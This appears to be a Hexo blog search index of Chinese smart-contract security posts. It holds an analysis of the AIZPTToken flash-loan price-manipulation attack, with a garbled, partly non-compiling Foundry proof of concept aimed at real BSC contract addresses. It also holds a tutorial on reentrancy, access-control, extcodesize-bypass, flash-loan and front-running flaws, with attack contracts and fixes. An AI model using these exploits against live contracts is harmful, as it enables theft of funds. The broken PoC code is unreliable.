<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF-Creativity</title>
      <link href="/2024/10/14/CTF-Creativity/"/>
      <url>/2024/10/14/CTF-Creativity/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20241005AIZPTToken攻击事件分析</title>
      <link href="/2024/10/12/20241005AIZPTToken%E8%AE%A1%E7%AE%97%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2024/10/12/20241005AIZPTToken%E8%AE%A1%E7%AE%97%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="AIZPTToken攻击事件分析"><a href="#AIZPTToken攻击事件分析" class="headerlink" title="AIZPTToken攻击事件分析"></a>AIZPTToken攻击事件分析</h2><p>先大概描述一下：攻击者使用闪电贷借的钱，然后再购买了价值8000 BNB的AIPTToken,然后再以高价卖出，从中得到利润，还清借款，最终获得价值34BNB（约俩万美金）。</p><p>这是发生在最近的攻击，首先攻击者发现了这个AIZPTToken代币买卖的计算错误，下面是截取的AIZPTToken合约中的一段代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function buy() internal &#123;</span><br><span class="line">   require(tradingEnable, &#x27;Trading not enable&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 swapValue = msg.value;</span><br><span class="line"></span><br><span class="line">   uint256 token_amount = (swapValue * _balances[address(this)]) / (address(this).balance);</span><br><span class="line"></span><br><span class="line">   require(token_amount &gt; 0, &#x27;Buy amount too low&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 user_amount = token_amount * 50 / 100;</span><br><span class="line">   uint256 fee_amount = token_amount - user_amount;</span><br><span class="line"></span><br><span class="line">   _transfer(address(this), msg.sender, user_amount);</span><br><span class="line">   _transfer(address(this), feeReceiver, fee_amount);</span><br><span class="line"></span><br><span class="line">   emit Swap(msg.sender, swapValue, 0, 0, user_amount);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> function sell(uint256 sell_amount) internal &#123;</span><br><span class="line">   require(tradingEnable, &#x27;Trading not enable&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 ethAmount = (sell_amount * address(this).balance) / (_balances[address(this)] + sell_amount);</span><br><span class="line"></span><br><span class="line">   require(ethAmount &gt; 0, &#x27;Sell amount too low&#x27;);</span><br><span class="line">   require(address(this).balance &gt;= ethAmount, &#x27;Insufficient ETH in reserves&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 swap_amount = sell_amount * 50 / 100;</span><br><span class="line">   uint256 burn_amount = sell_amount - swap_amount;</span><br><span class="line"></span><br><span class="line">   _transfer(msg.sender, address(this), swap_amount);</span><br><span class="line">   _transfer(msg.sender, address(0), burn_amount);</span><br><span class="line"></span><br><span class="line">   payable(msg.sender).transfer(ethAmount);</span><br><span class="line"></span><br><span class="line">   emit Swap(msg.sender, 0, sell_amount, ethAmount, 0);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> receive() external payable &#123;</span><br><span class="line">   buy();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>从上面，可以发现，用少量的BNB购买AIZPTToken,就可以以高价出售，具体可以对比俩段代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 token_amount = (swapValue * _balances[address(this)]) / (address(this).balance);</span><br><span class="line"></span><br><span class="line">uint256 ethAmount = (sell_amount * address(this).balance) / (_balances[address(this)] + sell_amount);</span><br></pre></td></tr></table></figure><p>第一个是买AIPTToken,如果以20的价钱购买12个代币，然后我们出售代币的时候，以同样的价格出售，那么代币的数量是不等于12的，换种方法来说，就是可以以高价出售相同代币的数量</p><p>下面是攻击者的攻击的测试合约</p><pre><code>//SPDX-License-Identifier: MITpragma solidity ^0.8.13;import &quot;forge-std/Test.sol&quot;import &quot;../interface.sol&quot;address constant PancakeV3Pool = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;address constant BUSDT = 0x55d398326f99059fF775485246999027B3197955;address constant weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;address constant AIZPT = 0xBe779D420b7D573C08EEe226B9958737b6218888;contract AIZPTTokentest is Test &#123;    address attracker = makeAddr(&quot;attracker&quot;);    function setUp() public&#123;        vm.creatPrankFork(&quot;bsc&quot;,42846998 - 1);    &#125;    function testPOC() public&#123;          vm.startPrank(attracker);          Attracker attracker = new Attrceker();          vm.label(address(attracker),&quot;attracek&quot;) ;          attracker.attrack();          console.log(&quot;&quot;)     &#125;&#125;interface IFS is IERC20&#123;    function flash(address recipient,uint256 amount0,uint256 amount1,bytes caaldata data) external;    function withdraw (uint256) external;    function deposit() exteranl paybale;&#125;contract Attracker&#123;    function attrack() external&#123;      IFS(Pancakev3Pool).flash(address(this),0,8000ehter,&quot;&quot;);            //将攻击合约中剩下的钱转给攻击者自己的地址        IERC20(weth).transfer(            msg.sender,             IERC20(weth).balanceOf(address(this))        );    &#125;     function pancakeV3FlashCallback(        uint256 fee0,        uint256 fee1,        bytes calldata data    ) external &#123;        IFS(weth).withdraw(8000 ether);             AIZPT.call&#123;value: 8000 ether&#125;(&quot;&quot;);        //出售200次        for (uint256 i; i &lt; 199; ++i) &#123;          //以383727 ether的价格卖出代币            IERC20(AIZPT).transfer(AIZPT, 3837275 ether);        &#125;        IFS(weth).deposit&#123;value: address(this).balance&#125;();         // 还清贷款和利息        IERC20(weth).transfer(PancakeV3Pool, 8004100000000000000000);    &#125;    receive() external payable&#123;&#125;&#125;从测试合约中来看,就是在执行闪电贷回调的时候,进行一个购买出售的操作完整的调用信息[点击](https://app.blocksec.com/explorer/tx/bsc/0x5e694707337cca979d18f9e45f40e81d6ca341ed342f1377f563e779a746460d?line=998&amp;debugLine=998)</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>智能合约的漏洞</title>
      <link href="/2024/10/07/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/10/07/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="智能合约的漏洞"><a href="#智能合约的漏洞" class="headerlink" title="智能合约的漏洞"></a>智能合约的漏洞</h1><h2 id="重入攻击"><a href="#重入攻击" class="headerlink" title="重入攻击"></a>重入攻击</h2><p> 重入漏洞本质上是状态同步问题，当智能合约调用外部函数时，执行流会转移到被调用的合约，如果调用合约未能正确同步状态，则在流程转移过程中可能会被重新进入，导致重复执行相同的代码逻辑。具体来说，攻击通常分两个步骤展开：<br>1，被攻击合约调用攻击合约的外部函数，并转移执行流程。<br>2，在攻击合约函数内部，利用一定的技巧，再次调用被攻击合约的漏洞函数。<br>由于以太坊虚拟机 (EVM) 是单线程的，因此在重新进入易受攻击的函数时，合约状态不会正确更新，类似于初始调用。这允许攻击者重复执行某些代码逻辑，从而实现意外行为。典型的攻击模式涉及多次重复的资金提取。</p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>以修改后的WETH为例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract EtherStore &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint256 bal = balances[msg.sender];</span><br><span class="line">        require(bal &gt; 0);</span><br><span class="line"></span><br><span class="line">        (bool sent,) = msg.sender.call&#123;value: bal&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line"></span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Helper function to check the balance of this contract</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在<strong>存款函数</strong>中，用户可以存入ETH，收到的WETH记录在<strong>余额</strong>状态变量中。</li><li>在<strong>withdraw函数</strong>中，用户可以通过调用 call 函数来提取 ETH，<strong>call</strong>函数用于向用户转账。此时，执行流程转移到用户的合约。如果用户合约是恶意的，它可以通过默认的<strong>accept函数重新进入withdraw函数</strong>。由于余额没有更新，<strong>require</strong>语句通过了检查，从而允许攻击合约重复提取 ETH。</li></ul><p>攻击者就可以部署一个名为Attack的恶意合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    EtherStore public etherStore;</span><br><span class="line">    uint256 public constant AMOUNT = 1 ether;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherStoreAddress) &#123;</span><br><span class="line">        etherStore = EtherStore(_etherStoreAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // receive is called when EtherStore sends Ether to this contract.</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(etherStore).balance &gt;= AMOUNT) &#123;</span><br><span class="line">            etherStore.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= AMOUNT);</span><br><span class="line">        etherStore.deposit&#123;value: AMOUNT&#125;();</span><br><span class="line">        etherStore.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Helper function to check the balance of this contract</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在<strong>攻击函数</strong>中，攻击者首先转入一定数量的ETH，调用<strong>etherStore.deposit</strong>函数将其转入目标合约<strong>EtherStore</strong> ，然后调用<strong>etherStore.withdraw</strong>函数提现ETH。这看似是一个常规操作，但问题就出现在下一个函数中。</li><li>合约收到 ETH 时默认执行的函数是<strong>accept</strong>，它标有<strong>payable</strong>关键字，表示它可以接收发送给它的 ETH（使用<strong>fallback</strong>函数可以实现类似的效果）。在函数内部，如果目标合约的余额满足条件（大于 1 ETH），则再次调用<strong>withdraw</strong>函数，触发重新进入。由于目标合约中用户余额只在最后一步更新，因此条件<strong>require(bal &gt; 0)</strong>;仍然成立，允许攻击者继续从目标合约中抽取 ETH 😨😨😨</li></ul><h2 id="访问控制漏洞"><a href="#访问控制漏洞" class="headerlink" title="访问控制漏洞"></a>访问控制漏洞</h2><h3 id="不受限制的初始化函数"><a href="#不受限制的初始化函数" class="headerlink" title="不受限制的初始化函数"></a>不受限制的初始化函数</h3><p>某些合约包含用于设置所有者的初始化函数，但未能限制该函数只能调用一次。攻击者可以利用这一点，再次调用初始化函数，将所有权转移到他们的账户中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function initContract() public &#123;</span><br><span class="line">    owner = msg.sender; // Lack of calling restriction</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过度授权的角色"><a href="#过度授权的角色" class="headerlink" title="过度授权的角色"></a>过度授权的角色</h3><p>使用 OpenZeppelin 的Ownable库时，如果多个角色被分配onlyOwner权限，则会增加攻击面。一旦攻击者获得具有所有者权限的帐户的访问权限，他们就可以执行合约中的任何关键功能。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function criticalFunction() public onlyOwner &#123;</span><br><span class="line">    // Critical logic</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="代币销毁函数授权不当"><a href="#代币销毁函数授权不当" class="headerlink" title="代币销毁函数授权不当"></a>代币销毁函数授权不当</h3><p>如果代币合约中的销毁函数是公开的，任何人都可以调用它来销毁别人的代币，从而操纵代币供应，导致价格波动和流动性枯竭。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function burn(address account, uint256 amount) public &#123;</span><br><span class="line">    _burn(account, amount); // No access control</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ERC20批准骗局"><a href="#ERC20批准骗局" class="headerlink" title="ERC20批准骗局"></a>ERC20批准骗局</h2><p>在区块链世界中，以太坊的ERC20代币标准是最知名的代币协议标准之一。然而在ERC20标准实施过程中，对approve函数的滥用会导致一个严重的安全漏洞ApproveScam 。接下来将对ApproveScam漏洞的原理、后果以及相应的预防措施进行探讨。</p><h3 id="ApproveScan漏洞是什么"><a href="#ApproveScan漏洞是什么" class="headerlink" title="ApproveScan漏洞是什么"></a>ApproveScan漏洞是什么</h3><p>ApproveScam 漏洞源于对ERC20 标准中<strong>批准函数的滥用</strong>。<strong>批准</strong>函数旨在允许代币持有者授权特定地址从持有者的账户中转出一定数量的代币。但是，如果持有者批准的金额过大（通常是<strong>type(uint256).max</strong>表示的无限金额），攻击者可以在未经持有者同意的情况下从持有者的账户中转出所有代币。</p><p>具体来说，一旦 Alice 授权 Eve 从 Alice 的账户中转出无限量的代币，Eve 就可以调用transferFrom函数将 Alice 账户中的所有代币转移到自己的账户中。这就是 ApproveScam 漏洞的核心原理。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Alice approves Eve to transfer an unlimited amount of tokens from Alice&#x27;s account</span><br><span class="line">ERC20Contract.approve(address(eve), type(uint256).max);</span><br><span class="line"></span><br><span class="line">// Eve uses the authorization to transfer all tokens from Alice&#x27;s account</span><br><span class="line">ERC20Contract.transferFrom(address(alice), address(eve), 1000);</span><br></pre></td></tr></table></figure><h3 id="ApproveScan的后果"><a href="#ApproveScan的后果" class="headerlink" title="ApproveScan的后果"></a>ApproveScan的后果</h3><p>ApproveScam 漏洞背后的原理虽然简单，但造成的损失却是灾难性的。一旦用户轻易授权某个地址，攻击者便可以在用户不知情的情况下，轻松将用户账户中的所有代币转走。</p><p>此外，ApproveScam 漏洞还可能被滥用于洗钱等其他非法活动。总而言之，ApproveScam 是一个严重的安全风险，开发人员和用户需要认真对待。</p><h3 id="如何预防ApproveScan"><a href="#如何预防ApproveScan" class="headerlink" title="如何预防ApproveScan"></a>如何预防ApproveScan</h3><p>预防 ApproveScam 漏洞的最佳方法是谨慎使用批准功能，尤其是在授权金额时。请遵循以下原则：</p><ul><li>仅在必要时调用批准功能，避免过度使用或滥用。</li><li>根据实际需要设置授权金额，例如permit(spender, amount)而不是permit(spender, type(uint256).max) 。</li><li>完成功能后立即撤销之前的授权，即approve(spender, 0) 。</li><li>在智能合约开发过程中，彻底检查批准功能的使用，以防止 ApproveScam 漏洞。</li></ul><h2 id="合约账户检查漏洞"><a href="#合约账户检查漏洞" class="headerlink" title="合约账户检查漏洞"></a>合约账户检查漏洞</h2><p>在 Solidity 智能合约开发中，开发者经常会使用各种检查机制来保证合约的安全。一种常见的做法是使用<strong>extcodesize函数</strong>来检查调用者地址的代码大小，从而区分合约账户和外部拥有账户（EOA）。然而，如果滥用该机制，攻击者可以利用合约构造函数中的临时漏洞绕过检查，发起恶意操作。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>智能合约在初次部署时，会先执行构造函数代码，在构造函数执行完成之前，新部署的合约地址上其实是没有任何字节码存在的，这就导致了基于 extcodesize 的检查存在一个盲点：如果攻击者在构造函数内立刻调用目标合约，由于攻击者合约地址上的字节码还未存储，因此<strong>extcodesize(address(this))会</strong>返回 0，从而绕过isContract 的检查。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        // At this point, extcodesize(address(this)) == 0</span><br><span class="line">        // Bypass the isContract check of the target contract</span><br><span class="line">        Target(_target).isContract(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码演示了一个典型的攻击场景，Attack合约在构造时传入Target合约地址，并立即在构造函数内调用Target.isContract()函数。由于Attack的部署尚未完成，isContract(address(this))将返回 false，从而允许攻击者绕过这一层保护并调用受保护的函数。</p><h3 id="漏洞利用演示"><a href="#漏洞利用演示" class="headerlink" title="漏洞利用演示"></a>漏洞利用演示</h3><p>Target合约有一个状态变量pwned,初始设置为false,该合约的设计初衷是只允许外部账户修改其值，而不允许合约账户修改，它通过isContract函数实现者一点，该函数依赖于extaodesize的方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.18;</span><br><span class="line"></span><br><span class="line">contract Target &#123;</span><br><span class="line">    function isContract(address account) public view returns (bool) &#123;</span><br><span class="line">        // This method relies on extcodesize, which returns 0 for contracts in</span><br><span class="line">        // construction, since the code is only stored at the end of the</span><br><span class="line">        // constructor execution.</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(account)</span><br><span class="line">        &#125;</span><br><span class="line">        return size &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bool public pwned = false;</span><br><span class="line"></span><br><span class="line">    function protected() external &#123;</span><br><span class="line">        require(!isContract(msg.sender), &quot;no contract allowed&quot;);</span><br><span class="line">        pwned = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们要修改pwned的值，使用以下代码是不能攻击成功的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract FailedAttack &#123;</span><br><span class="line">    // Attempting to call Target.protected will fail,</span><br><span class="line">    // Target blocks calls from contracts</span><br><span class="line">    function pwn(address _target) external &#123;</span><br><span class="line">        // This will fail</span><br><span class="line">        Target(_target).protected();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为Target合约只允许外部账户（EOA）调用，而我们的攻击合约是不能修改的</p><p>如果我们在构造函数中调用，其就会绕过isContract的检查，攻击代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    bool public isContract;</span><br><span class="line">    address public addr;</span><br><span class="line"></span><br><span class="line">    // When contract is being created, code size (extcodesize) is 0.</span><br><span class="line">    // This will bypass the isContract() check</span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        isContract = Target(_target).isContract(address(this));</span><br><span class="line">        addr = address(this);</span><br><span class="line">        // This will work</span><br><span class="line">        Target(_target).protected();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="预防措施"><a href="#预防措施" class="headerlink" title="预防措施"></a>预防措施</h3><p>为了修复此漏洞，我们可以不依赖extcodesize来执行检查，而是直接比较tx.origin和msg.sender是否相同。由于tx.origin始终指向最初发起交易的 EOA 地址，因此我们可以有效区分合约和 EOA 调用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function isContract(address account) public view returns (bool) &#123;</span><br><span class="line">    require(tx.origin == msg.sender);</span><br><span class="line">    return account.code.length &gt; 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="闪电贷攻击"><a href="#闪电贷攻击" class="headerlink" title="闪电贷攻击"></a>闪电贷攻击</h2><h3 id="闪电贷贷款人漏洞1"><a href="#闪电贷贷款人漏洞1" class="headerlink" title="闪电贷贷款人漏洞1"></a>闪电贷贷款人漏洞1</h3><p> MyToken是标准的 ERC20 代币，作为LenderPool内可供借贷的资产。</p><p> LenderPool合约允许用户执行闪电贷交易，其flashLoan函数接受用户请求，借出一定数量的代币，调用目标合约上的特定操作，并偿还贷款。在函数的最后，它会验证偿还后的余额是否大于偿还前的余额。通常，偿还金额包括本金和利息。因此，在发起贷款后，池子的余额应该增加。否则，贷款交易失败。</p><p> 该合约的漏洞在于目标合约的低代码调用。由于这里没有任何验证机制，并且调用函数提供了广泛的操作能力，例如获取LenderPool中MyToken代币的授权，因此可以从池中抽取所有资产。<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> // SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.18;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract LenderPool is ReentrancyGuard &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    MyToken public token;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line"></span><br><span class="line">    constructor(MyToken _token) &#123;</span><br><span class="line">        token = _token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(</span><br><span class="line">        uint256 amount,</span><br><span class="line">        address borrower,</span><br><span class="line">        address target,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external nonReentrant returns (bool) &#123;</span><br><span class="line">        uint256 balanceBefore = token.balanceOf(address(this));</span><br><span class="line">        bool ret = token.transfer(borrower, amount);</span><br><span class="line"></span><br><span class="line">        // it&#x27;s dangerous</span><br><span class="line">        target.functionCall(data);</span><br><span class="line"></span><br><span class="line">        if (token.balanceOf(address(this)) &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyToken is ERC20, Ownable &#123;</span><br><span class="line">    constructor() ERC20(&quot;MyToken&quot;, &quot;MTK&quot;) Ownable(msg.sender) &#123;</span><br><span class="line">        _mint(msg.sender, 10000 * 10**decimals());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在<strong>Attack合约</strong>的攻击函数中，攻击者从池合约发起一次闪电贷，借入 0 个代币，因为此时他们不需要这些代币。相反，他们构造 calldata以获得<strong>LenderPool</strong>的批准。一旦<strong>flashLoan</strong>函数成功执行，他们就会获得授权并执行<strong>transferFrom</strong>操作将代币转移到自己的地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    LenderPool pool;</span><br><span class="line">    MyToken token;</span><br><span class="line"></span><br><span class="line">    constructor(address _pool, address _token) &#123;</span><br><span class="line">        pool = LenderPool(_pool);</span><br><span class="line">        token = MyToken(_token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack()</span><br><span class="line">        public</span><br><span class="line">        returns (uint256 before_balance, uint256 after_balance)</span><br><span class="line">    &#123;</span><br><span class="line">        before_balance = token.balanceOf(address(this));</span><br><span class="line">        bytes memory _calldata = abi.encodeWithSignature(</span><br><span class="line">            &quot;approve(address,uint256)&quot;,</span><br><span class="line">            address(this),</span><br><span class="line">            10000</span><br><span class="line">        );</span><br><span class="line">        pool.flashLoan(0, address(this), address(token), _calldata);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        token.transferFrom(address(pool), address(this), 10000);</span><br><span class="line">        after_balance = token.balanceOf(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="闪电贷贷款人漏洞2"><a href="#闪电贷贷款人漏洞2" class="headerlink" title="闪电贷贷款人漏洞2"></a>闪电贷贷款人漏洞2</h3><p>这是一个具有漏洞的合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IFlashLoanEtherReceiver &#123;</span><br><span class="line">    function execute() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract EthLenderPool &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line">    event Deposit(address indexed who, uint256 amount);</span><br><span class="line">    event Withdraw(address indexed who, uint256 amount);</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            balances[msg.sender] += msg.value;</span><br><span class="line">        &#125;</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        uint256 amount = balances[msg.sender];</span><br><span class="line">        delete balances[msg.sender];</span><br><span class="line">        emit Withdraw(msg.sender, amount);</span><br><span class="line">        SafeTransferLib.safeTransferETH(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 amount) external &#123;</span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line">        IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line">        if (address(this).balance &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>存款和取款函数用于存入和提取 ETH，用户 ETH 余额记录在合约的余额状态变量中。</li><li>flashLoan函数用于借出资金。在这里，借款人必须实现IFlashLoanEtherReceiver接口。当资金发送到借款人合约时，还会调用接口中定义的回调函数execute ，允许借款人执行自定义业务逻辑。但是，必须确保借入的资金偿还给贷方池，以保持余额大于或等于原始余额。否则将导致借贷失败。<blockquote><p>风险：只检查还款后的余额大小。但这个余额可能包括用户在合约中持有的资产，用户可以随时提取这些资产。</p></blockquote></li></ul><p>以下是攻击者合约，在执行回调函数中，攻击者将借入的资金存回池中，确保池子的余额不会减少，但这些资金现在被记录为攻击者</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack is IFlashLoanEtherReceiver&#123;</span><br><span class="line">    EthLenderPool pool;</span><br><span class="line"></span><br><span class="line">    constructor(address _pool) &#123;</span><br><span class="line">        pool = EthLenderPool(_pool);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint amount) public &#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">        pool.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        pool.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="抢跑交易"><a href="#抢跑交易" class="headerlink" title="抢跑交易"></a>抢跑交易</h2><p>它的本质就是利用了交易顺序进行获利</p><p>先说以下内涵，通俗来讲，就是被人比你快一步，因为在区块链上的交易都是公开透明的，就是能够获取其他人的交易，攻击者发现了你的交易信息，然后他支出更高的gas费用，在你之前进行交易，就会导致一些问题出现</p><blockquote><p>在以太坊交易中，当你发起一个交易时，首先会进行打包进入交易池，然后矿工来处理这些交易，当然，优先处理gas费更高的交易<br>举例：这是一个猜谜游戏，猜对即可获得10个ehter</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier:MIT</span><br><span class="line"></span><br><span class="line">pragma solidity^0.8.17;</span><br><span class="line"></span><br><span class="line">constract FindThisHash&#123;</span><br><span class="line">    bytes32 public constant hash = 111111;</span><br><span class="line"></span><br><span class="line">    constructor () payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function solve (string memory solution) public&#123;</span><br><span class="line">        require(hash == keccak256(abi.encodePascked(solution)),&quot;Incorrect answer&quot;);</span><br><span class="line">        (bool sent, ) = msg.sender.call&#123;value：10 ehter&#125;(&quot;&quot;);</span><br><span class="line">        require(sent,&quot;Failed to send Ehter&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>A猜中了答案，调用了solve函数输入正确的答案此时的gas的价格设置为15gwei，然后有个人在交易池发现了这个，B就获取了A的答案，他又用比15gwei高的价格调用solve函数，然后矿工就会先处理B的交易，最后B获得了10以太币的奖励</p><h3 id="预防措施-1"><a href="#预防措施-1" class="headerlink" title="预防措施"></a>预防措施</h3><p>采用 Commit-Reveal 的模式，该方案有两个阶段：Commit 阶段，提交特定的值（比如包含答案的 Hash 值，答案并没有直接暴露出来）；以及 Reveal 阶段，其中揭示并检查值（校验答案是否正确）。</p><p>为了更好地理解，可以想象一下，发送者 Alice 将一条消息放入一个上锁的盒子中，然后将其交给接收者 Bob。Bob 以及其他任何人无法访问该消息，因为它被锁在盒子里，但是当 Alice 想要透露该消息时，她可以解锁盒子并将该消息显示给 Bob。</p><h2 id="签名重放攻击"><a href="#签名重放攻击" class="headerlink" title="签名重放攻击"></a>签名重放攻击</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>抢先交易攻击</title>
      <link href="/2024/10/07/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/07/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93%E6%94%BB%E5%87%BB/</url>
      
